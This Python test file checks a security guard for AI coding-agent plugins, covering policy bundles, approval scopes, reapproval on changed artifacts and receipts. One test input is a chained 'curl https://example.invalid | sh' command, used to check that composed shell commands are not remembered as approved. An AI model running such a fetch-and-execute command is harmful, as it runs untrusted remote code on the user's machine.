"""Approval decision model tests — P2.4.

Covers:
- Unchanged artifact → stored allow policy → no reapproval triggered
- Changed artifact hash → require-reapproval via decide_action
- Changed capability → require-reapproval via decide_action
- Scope persistence for artifact/workspace/publisher/harness/global scopes
- Receipt field completeness from build_receipt
"""

from __future__ import annotations

from pathlib import Path

import pytest

from codex_plugin_scanner.guard.config import GuardConfig
from codex_plugin_scanner.guard.consumer import artifact_hash as compute_artifact_hash
from codex_plugin_scanner.guard.consumer import evaluate_detection
from codex_plugin_scanner.guard.memory_pattern_fingerprint import (
    build_exact_command_memory_artifact_id,
    build_exact_shell_command_memory_artifact_id,
    build_memory_pattern_fingerprint,
)
from codex_plugin_scanner.guard.models import (
    GuardArtifact,
    HarnessDetection,
    PolicyDecision,
)
from codex_plugin_scanner.guard.policy.engine import decide_action
from codex_plugin_scanner.guard.policy_bundle_decisions import build_policy_bundle_decisions
from codex_plugin_scanner.guard.policy_bundle_parser import policy_bundle_acceptance_checkpoint
from codex_plugin_scanner.guard.receipts.manager import build_receipt
from codex_plugin_scanner.guard.store import GuardStore
from tests.policy_bundle_signing_helpers import policy_bundle_test_keyring, sign_policy_bundle

_POLICY_BUNDLE_WORKSPACE_ID = "workspace-1"


def _install_signed_exact_policies(
    store: GuardStore,
    policies: list[tuple[str, str, str]],
    *,
    now: str,
    bundle_version: str,
) -> None:
    rules = [
        {
            "ruleId": f"test-rule-{index}",
            "action": action,
            "reason": reason,
            "artifactId": artifact_id,
            "scope": {
                "agents": [],
                "devices": [],
                "ecosystems": [],
                "environments": [],
                "harnesses": ["codex"],
                "locations": [],
            },
        }
        for index, (artifact_id, action, reason) in enumerate(policies)
    ]
    bundle = sign_policy_bundle(
        {
            "contractVersion": "guard-policy-bundle.v1",
            "bundleVersion": bundle_version,
            "bundleHash": "",
            "issuedAt": now,
            "expiresAt": None,
            "rolloutState": "enforcing",
            "policyDefaults": {
                "mode": "observe",
                "defaultAction": "allow",
                "unknownPublisherAction": "allow",
                "changedHashAction": "allow",
                "newNetworkDomainAction": "allow",
                "subprocessAction": "allow",
                "telemetryEnabled": False,
                "syncEnabled": True,
            },
            "rules": rules,
            "cloudExceptions": [],
            "acknowledgements": [],
        },
        workspace_id=_POLICY_BUNDLE_WORKSPACE_ID,
    )
    keyring = policy_bundle_test_keyring(workspace_id=_POLICY_BUNDLE_WORKSPACE_ID)
    store.set_sync_payload(
        "oauth_local_credentials",
        {"workspace_id": _POLICY_BUNDLE_WORKSPACE_ID},
        now,
    )
    device = store.get_device_metadata()
    decisions = build_policy_bundle_decisions(
        bundle,
        device_id=device["installation_id"],
        device_name=device["device_label"],
    )
    assert [(item.artifact_id, item.action, item.reason) for item in decisions] == policies
    store.apply_policy_bundle_authority(
        decisions,
        now,
        policy_bundle=bundle,
        policy_bundle_keyring=keyring,
        cloud_exceptions=[],
        policy_bundle_ack={"bundleVersion": bundle_version, "status": "applied"},
        policy_bundle_checkpoint=policy_bundle_acceptance_checkpoint(bundle),
        update_last_good=True,
        remote_write_authorized=True,
    )


def _make_artifact(
    artifact_id: str = "codex:project:my_tool",
    command: str = "python",
    args: tuple[str, ...] = ("-m", "my_tool"),
    publisher: str | None = None,
) -> GuardArtifact:
    return GuardArtifact(
        artifact_id=artifact_id,
        name="my_tool",
        harness="codex",
        artifact_type="mcp_server",
        source_scope="project",
        config_path="/home/user/.codex/config.toml",
        command=command,
        args=args,
        transport="stdio",
        publisher=publisher,
    )


def _make_config(tmp_path: Path, default_action: str = "require-reapproval") -> GuardConfig:
    return GuardConfig(
        guard_home=tmp_path / "guard",
        workspace=tmp_path / "workspace",
        default_action=default_action,
    )


def _make_store(tmp_path: Path) -> GuardStore:
    return GuardStore(tmp_path / "guard")


def test_resolve_policy_without_matching_rules_skips_policy_integrity_refresh(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    store = _make_store(tmp_path)

    def fail_refresh(*_args, **_kwargs):
        raise AssertionError("policy integrity refresh should not run for an empty policy lookup")

    monkeypatch.setattr(store, "_refresh_policy_integrity_state", fail_refresh)
    monkeypatch.setattr(store, "_policy_integrity_secret_material", fail_refresh)

    assert store.resolve_policy("codex", "codex:project:none", "hash-none") is None


def test_resolve_policy_with_remote_only_rule_skips_policy_integrity_refresh(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    store = _make_store(tmp_path)
    artifact_id = "codex:project:remote-only"
    artifact_hash = "hash-remote"
    _install_signed_exact_policies(
        store,
        [(artifact_id, "allow", "remote policy")],
        now="2026-06-26T00:00:00Z",
        bundle_version="policy-2026-06-26.1",
    )

    def fail_refresh(*_args, **_kwargs):
        raise AssertionError("policy integrity refresh should not run for remote-only policy lookups")

    monkeypatch.setattr(store, "_refresh_policy_integrity_state", fail_refresh)
    monkeypatch.setattr(store, "_policy_integrity_secret_material", fail_refresh)

    assert store.resolve_policy("codex", artifact_id, artifact_hash) == "allow"


@pytest.mark.parametrize("policy_action", ["allow", "block"])
def test_remote_suggested_memory_policy_matches_runtime_command_pattern(
    tmp_path: Path,
    policy_action: str,
) -> None:
    store = _make_store(tmp_path)
    remembered = build_memory_pattern_fingerprint(
        command="npm install lodash",
        artifact_type="shell_command",
        artifact_id="codex:runtime:shell:request-one",
        artifact_name="Shell command",
        harness="codex",
    )
    assert remembered is not None
    _install_signed_exact_policies(
        store,
        [
            (
                f"memory:codex:{remembered.kind}:{remembered.fingerprint}",
                policy_action,
                "Suggested Memory",
            )
        ],
        now="2026-07-11T00:00:00Z",
        bundle_version=f"policy-2026-07-11.suggested-{policy_action}",
    )

    assert (
        store.resolve_policy(
            "codex",
            "codex:runtime:shell:request-two",
            memory_command="npm i lodash@latest",
            memory_artifact_type="shell_command",
            memory_artifact_name="Shell command",
        )
        == policy_action
    )
    assert (
        store.resolve_policy(
            "codex",
            "codex:runtime:shell:request-three",
            memory_command="npm install react",
            memory_artifact_type="shell_command",
            memory_artifact_name="Shell command",
        )
        is None
    )


@pytest.mark.parametrize("policy_action", ["allow", "block"])
def test_remote_exact_command_policy_rejects_command_suffix(
    tmp_path: Path,
    policy_action: str,
) -> None:
    store = _make_store(tmp_path)
    exact_artifact_id = build_exact_command_memory_artifact_id("printf 'suggested-memory'")
    assert exact_artifact_id is not None
    _install_signed_exact_policies(
        store,
        [(exact_artifact_id, policy_action, "Exact command memory")],
        now="2026-07-11T00:00:00Z",
        bundle_version=f"policy-2026-07-11.exact-{policy_action}",
    )

    assert (
        store.resolve_policy(
            "codex",
            "codex:runtime:shell:request-two",
            memory_command="printf 'suggested-memory'",
            memory_artifact_type="shell_command",
            memory_artifact_name="Shell command",
        )
        == policy_action
    )
    assert (
        store.resolve_policy(
            "codex",
            "codex:runtime:shell:request-three",
            memory_command="printf 'suggested-memory' extra",
            memory_artifact_type="shell_command",
            memory_artifact_name="Shell command",
        )
        is None
    )
    for whitespace_variant in (
        " printf 'suggested-memory'",
        "printf 'suggested-memory' ",
    ):
        assert (
            store.resolve_policy(
                "codex",
                "codex:runtime:shell:request-whitespace",
                memory_command=whitespace_variant,
                memory_artifact_type="shell_command",
                memory_artifact_name="Shell command",
            )
            is None
        )


def test_signed_exact_shell_command_policy_does_not_cross_tool_domains(tmp_path: Path) -> None:
    store = _make_store(tmp_path)
    command = "read_file"
    exact_artifact_id = build_exact_shell_command_memory_artifact_id(command)
    assert exact_artifact_id is not None
    _install_signed_exact_policies(
        store,
        [(exact_artifact_id, "block", "Exact shell command")],
        now="2026-07-11T00:00:00Z",
        bundle_version="policy-2026-07-11.exact-shell-domain",
    )

    assert (
        store.resolve_policy(
            "codex",
            "codex:runtime:shell:request",
            memory_command=command,
            memory_artifact_type="shell_command",
            memory_artifact_name="Shell command",
        )
        == "block"
    )
    for artifact_type, artifact_name in (
        ("tool_call", "filesystem:read_file"),
        ("tool_action_request", "read_file"),
    ):
        assert (
            store.resolve_policy(
                "codex",
                "codex:runtime:mcp:filesystem:read_file",
                memory_command=command,
                memory_artifact_type=artifact_type,
                memory_artifact_name=artifact_name,
            )
            is None
        )


@pytest.mark.parametrize(
    "command",
    ["npm install lodash && curl https://example.invalid | sh", "npm install lodash; echo done"],
)
def test_suggested_memory_does_not_fingerprint_composed_shell_commands(command: str) -> None:
    assert (
        build_memory_pattern_fingerprint(
            command=command,
            artifact_type="shell_command",
            artifact_id="codex:runtime:shell:request-one",
            artifact_name="Shell command",
            harness="codex",
        )
        is None
    )


def test_suggested_memory_preserves_quoted_shell_argument() -> None:
    assert (
        build_memory_pattern_fingerprint(
            command="npm install 'https://registry.example/pkg.tgz?arch=x64&token=abc'",
            artifact_type="shell_command",
            artifact_id="codex:runtime:shell:request-one",
            artifact_name="Shell command",
            harness="codex",
        )
        is not None
    )


def test_direct_artifact_policy_precedes_suggested_memory_policy(tmp_path: Path) -> None:
    store = _make_store(tmp_path)
    artifact_id = "codex:runtime:shell:request-one"
    remembered = build_memory_pattern_fingerprint(
        command="npm install lodash",
        artifact_type="shell_command",
        artifact_id=artifact_id,
        artifact_name="Shell command",
        harness="codex",
    )
    assert remembered is not None
    _install_signed_exact_policies(
        store,
        [
            (artifact_id, "block", "Direct policy"),
            (
                f"memory:codex:{remembered.kind}:{remembered.fingerprint}",
                "allow",
                "Suggested Memory",
            ),
        ],
        now="2026-07-11T00:00:00Z",
        bundle_version="policy-2026-07-11.direct-precedence",
    )

    assert (
        store.resolve_policy(
            "codex",
            artifact_id,
            memory_command="npm install lodash",
            memory_artifact_type="shell_command",
            memory_artifact_name="Shell command",
        )
        == "block"
    )


class TestDecideAction:
    def test_allow_policy_passes_through_unchanged(self) -> None:
        config = GuardConfig(guard_home=Path("/tmp/test-guard"), workspace=None)
        result = decide_action(
            configured_action="allow",
            default_action="require-reapproval",
            config=config,
            changed=False,
        )
        assert result == "allow"

    def test_changed_triggers_changed_hash_action_when_no_configured_policy(self) -> None:
        config = GuardConfig(
            guard_home=Path("/tmp/test-guard"),
            workspace=None,
            changed_hash_action="require-reapproval",
        )
        result = decide_action(
            configured_action=None,
            default_action="allow",
            config=config,
            changed=True,
        )
        assert result == "require-reapproval"

    def test_configured_allow_beats_changed_flag(self) -> None:
        config = GuardConfig(
            guard_home=Path("/tmp/test-guard"),
            workspace=None,
            changed_hash_action="require-reapproval",
        )
        result = decide_action(
            configured_action="allow",
            default_action="allow",
            config=config,
            changed=True,
        )
        assert result == "allow"

    def test_changed_falls_back_to_safe_when_no_changed_hash_action(self) -> None:
        config = GuardConfig(guard_home=Path("/tmp/test-guard"), workspace=None)
        result = decide_action(
            configured_action=None,
            default_action=None,
            config=config,
            changed=True,
        )
        assert result == "require-reapproval"

    def test_block_policy_blocks_regardless_of_changed_flag(self) -> None:
        config = GuardConfig(guard_home=Path("/tmp/test-guard"), workspace=None)
        result = decide_action(
            configured_action="block",
            default_action="allow",
            config=config,
            changed=False,
        )
        assert result == "block"

    def test_no_policy_uses_config_default(self) -> None:
        config = GuardConfig(
            guard_home=Path("/tmp/test-guard"),
            workspace=None,
            default_action="warn",
        )
        result = decide_action(
            configured_action=None,
            default_action=None,
            config=config,
            changed=False,
        )
        assert result == "warn"

    def test_explicit_default_action_overrides_config(self) -> None:
        config = GuardConfig(
            guard_home=Path("/tmp/test-guard"),
            workspace=None,
            default_action="warn",
        )
        result = decide_action(
            configured_action=None,
            default_action="allow",
            config=config,
            changed=False,
        )
        assert result == "allow"


class TestPolicyScopePersistence:
    def test_artifact_scope_allow_resolves_for_matching_hash(self, tmp_path: Path) -> None:
        store = _make_store(tmp_path)
        store.upsert_policy(
            PolicyDecision(
                harness="codex",
                scope="artifact",
                action="allow",
                artifact_id="codex:project:my_tool",
                artifact_hash="abc123",
            ),
            "2026-01-01T00:00:00+00:00",
        )
        result = store.resolve_policy("codex", "codex:project:my_tool", "abc123")
        assert result == "allow"

    def test_artifact_scope_allow_resolves_without_hash_when_policy_has_no_hash(self, tmp_path: Path) -> None:
        store = _make_store(tmp_path)
        store.upsert_policy(
            PolicyDecision(
                harness="codex",
                scope="artifact",
                action="allow",
                artifact_id="codex:project:my_tool",
                artifact_hash=None,
            ),
            "2026-01-01T00:00:00+00:00",
        )
        result = store.resolve_policy("codex", "codex:project:my_tool", "any-hash")
        assert result == "allow"

    def test_publisher_scope_resolves_for_any_artifact_by_publisher(self, tmp_path: Path) -> None:
        store = _make_store(tmp_path)
        store.upsert_policy(
            PolicyDecision(
                harness="codex",
                scope="publisher",
                action="allow",
                publisher="verified-org",
            ),
            "2026-01-01T00:00:00+00:00",
        )
        result = store.resolve_policy("codex", "codex:project:any_tool", "hash-x", publisher="verified-org")
        assert result == "allow"

    def test_publisher_scope_does_not_match_different_publisher(self, tmp_path: Path) -> None:
        store = _make_store(tmp_path)
        store.upsert_policy(
            PolicyDecision(
                harness="codex",
                scope="publisher",
                action="allow",
                publisher="verified-org",
            ),
            "2026-01-01T00:00:00+00:00",
        )
        result = store.resolve_policy("codex", "codex:project:any_tool", "hash-x", publisher="unknown-org")
        assert result is None

    def test_harness_scope_resolves_for_all_artifacts_in_harness(self, tmp_path: Path) -> None:
        store = _make_store(tmp_path)
        store.upsert_policy(
            PolicyDecision(
                harness="codex",
                scope="harness",
                action="allow",
            ),
            "2026-01-01T00:00:00+00:00",
        )
        result = store.resolve_policy("codex", "codex:project:any_tool", "hash-y")
        assert result == "allow"

    def test_harness_unsupported_family_is_rejected_without_policy_row(self, tmp_path: Path) -> None:
        store = _make_store(tmp_path)
        with pytest.raises(ValueError, match="unsupported_scoped_policy_family"):
            store.upsert_policy(
                PolicyDecision(
                    harness="codex",
                    scope="harness",
                    action="allow",
                    artifact_id="family:tool-output",
                ),
                "2026-01-01T00:00:00+00:00",
            )
        assert store.list_policy_decisions("codex") == []
        for artifact_id in (
            "codex:project:tool-output:stdout",
            "codex:project:tool-action:run-shell",
            "codex:project:file-read:.npmrc",
        ):
            assert store.resolve_policy("codex", artifact_id, "hash") is None

    def test_global_scope_resolves_for_any_harness(self, tmp_path: Path) -> None:
        store = _make_store(tmp_path)
        store.upsert_policy(
            PolicyDecision(
                harness="codex",
                scope="global",
                action="block",
            ),
            "2026-01-01T00:00:00+00:00",
        )
        result = store.resolve_policy("codex", "codex:project:anything", "hash-z")
        assert result == "block"

    def test_artifact_scope_takes_precedence_over_global_scope(self, tmp_path: Path) -> None:
        store = _make_store(tmp_path)
        store.upsert_policy(
            PolicyDecision(
                harness="codex",
                scope="global",
                action="block",
            ),
            "2026-01-01T00:00:00+00:00",
        )
        store.upsert_policy(
            PolicyDecision(
                harness="codex",
                scope="artifact",
                action="allow",
                artifact_id="codex:project:trusted_tool",
                artifact_hash=None,
            ),
            "2026-01-01T00:00:00+00:00",
        )
        result = store.resolve_policy("codex", "codex:project:trusted_tool", "any-hash")
        assert result == "allow"

    def test_expired_policy_is_not_matched(self, tmp_path: Path) -> None:
        store = _make_store(tmp_path)
        store.upsert_policy(
            PolicyDecision(
                harness="codex",
                scope="artifact",
                action="allow",
                artifact_id="codex:project:my_tool",
                artifact_hash=None,
                expires_at="2025-01-01T00:00:00+00:00",
            ),
            "2024-12-01T00:00:00+00:00",
        )
        result = store.resolve_policy(
            "codex",
            "codex:project:my_tool",
            "hash-abc",
            now="2026-01-01T00:00:00+00:00",
        )
        assert result is None


class TestEvaluateDetectionScopePersistence:
    def test_legacy_stored_allow_cannot_lower_current_reapproval(self, tmp_path: Path) -> None:
        store = _make_store(tmp_path)
        config = _make_config(tmp_path)
        artifact = _make_artifact()

        store.upsert_policy(
            PolicyDecision(
                harness="codex",
                scope="artifact",
                action="allow",
                artifact_id=artifact.artifact_id,
                artifact_hash=None,
            ),
            "2026-01-01T00:00:00+00:00",
        )

        detection = HarnessDetection(
            harness="codex",
            installed=True,
            command_available=True,
            config_paths=(artifact.config_path,),
            artifacts=(artifact,),
        )

        result = evaluate_detection(detection, store, config, persist=False)

        artifact_result = result["artifacts"][0]
        assert artifact_result["policy_action"] == "require-reapproval"
        assert artifact_result["approval_reuse_status"] == "rejected"
        assert artifact_result["approval_reuse_reason_code"] == "approval_reuse_content_changed"
        assert result["blocked"] is True

    def test_changed_artifact_hash_without_stored_policy_triggers_reapproval(self, tmp_path: Path) -> None:
        store = _make_store(tmp_path)
        config = _make_config(tmp_path)
        artifact_v1 = _make_artifact(args=("-m", "my_tool", "--port", "8000"))
        artifact_v2 = _make_artifact(args=("-m", "my_tool", "--port", "9000"))

        detection_v1 = HarnessDetection(
            harness="codex",
            installed=True,
            command_available=True,
            config_paths=(artifact_v1.config_path,),
            artifacts=(artifact_v1,),
        )
        evaluate_detection(detection_v1, store, config, persist=True)

        detection_v2 = HarnessDetection(
            harness="codex",
            installed=True,
            command_available=True,
            config_paths=(artifact_v2.config_path,),
            artifacts=(artifact_v2,),
        )
        result = evaluate_detection(detection_v2, store, config, persist=False)

        artifact_result = result["artifacts"][0]
        assert artifact_result["policy_action"] in {"require-reapproval", "block", "sandbox-required"}
        assert result["blocked"] is True

    def test_hash_locked_policy_does_not_match_new_hash_triggers_reapproval(self, tmp_path: Path) -> None:
        store = _make_store(tmp_path)
        config = _make_config(tmp_path, default_action="allow")
        artifact_v1 = _make_artifact(args=("-m", "my_tool", "--port", "8000"))
        artifact_v2 = _make_artifact(args=("-m", "my_tool", "--port", "9999"))

        v1_hash = compute_artifact_hash(artifact_v1)
        store.upsert_policy(
            PolicyDecision(
                harness="codex",
                scope="artifact",
                action="allow",
                artifact_id=artifact_v1.artifact_id,
                artifact_hash=v1_hash,
            ),
            "2026-01-01T00:00:00+00:00",
        )

        detection_v1 = HarnessDetection(
            harness="codex",
            installed=True,
            command_available=True,
            config_paths=(artifact_v1.config_path,),
            artifacts=(artifact_v1,),
        )
        evaluate_detection(detection_v1, store, config, persist=True)

        detection_v2 = HarnessDetection(
            harness="codex",
            installed=True,
            command_available=True,
            config_paths=(artifact_v2.config_path,),
            artifacts=(artifact_v2,),
        )
        result = evaluate_detection(detection_v2, store, config, persist=False)

        artifact_result = result["artifacts"][0]
        assert artifact_result["policy_action"] in {"require-reapproval", "block", "sandbox-required"}
        assert result["blocked"] is True


class TestBuildReceipt:
    def test_build_receipt_populates_required_fields(self) -> None:
        receipt = build_receipt(
            harness="codex",
            artifact_id="codex:project:my_tool",
            artifact_hash="sha256-abc",
            policy_decision="allow",
            capabilities_summary="command: python",
            changed_capabilities=[],
            provenance_summary="project artifact at /workspace/.codex/config.toml (provenance: local)",
            artifact_name="my_tool",
            source_scope="project",
        )

        assert receipt.receipt_id.startswith("guard-receipt-")
        assert receipt.harness == "codex"
        assert receipt.artifact_id == "codex:project:my_tool"
        assert receipt.artifact_hash == "sha256-abc"
        assert receipt.policy_decision == "allow"
        assert receipt.capabilities_summary == "command: python"
        assert receipt.changed_capabilities == ()
        assert "project artifact" in receipt.provenance_summary
        assert receipt.artifact_name == "my_tool"
        assert receipt.source_scope == "project"
        assert receipt.timestamp != ""

    def test_build_receipt_changed_capabilities_are_stored_as_tuple(self) -> None:
        receipt = build_receipt(
            harness="codex",
            artifact_id="codex:project:my_tool",
            artifact_hash="sha256-abc",
            policy_decision="require-reapproval",
            capabilities_summary="command: python",
            changed_capabilities=["args", "command"],
            provenance_summary="project artifact",
            artifact_name="my_tool",
            source_scope="project",
        )
        assert receipt.changed_capabilities == ("args", "command")

    def test_build_receipt_user_override_defaults_to_none(self) -> None:
        receipt = build_receipt(
            harness="codex",
            artifact_id="codex:project:my_tool",
            artifact_hash="hash",
            policy_decision="allow",
            capabilities_summary="",
            changed_capabilities=[],
            provenance_summary="provenance",
            artifact_name=None,
            source_scope=None,
        )
        assert receipt.user_override is None

    def test_build_receipt_to_dict_serializes_scanner_evidence(self) -> None:
        evidence = [{"type": "scan", "finding": "clean"}]
        receipt = build_receipt(
            harness="codex",
            artifact_id="codex:project:my_tool",
            artifact_hash="hash",
            policy_decision="allow",
            capabilities_summary="",
            changed_capabilities=[],
            provenance_summary="provenance",
            artifact_name=None,
            source_scope=None,
            scanner_evidence=evidence,
        )
        d = receipt.to_dict()
        assert isinstance(d["scanner_evidence"], list)
        assert d["scanner_evidence"][0]["type"] == "scan"

    def test_build_receipt_generates_unique_receipt_ids(self) -> None:
        receipts = [
            build_receipt(
                harness="codex",
                artifact_id=f"codex:project:tool_{i}",
                artifact_hash="hash",
                policy_decision="allow",
                capabilities_summary="",
                changed_capabilities=[],
                provenance_summary="provenance",
                artifact_name=None,
                source_scope=None,
            )
            for i in range(5)
        ]
        ids = {r.receipt_id for r in receipts}
        assert len(ids) == 5, "Each receipt must have a unique receipt_id"
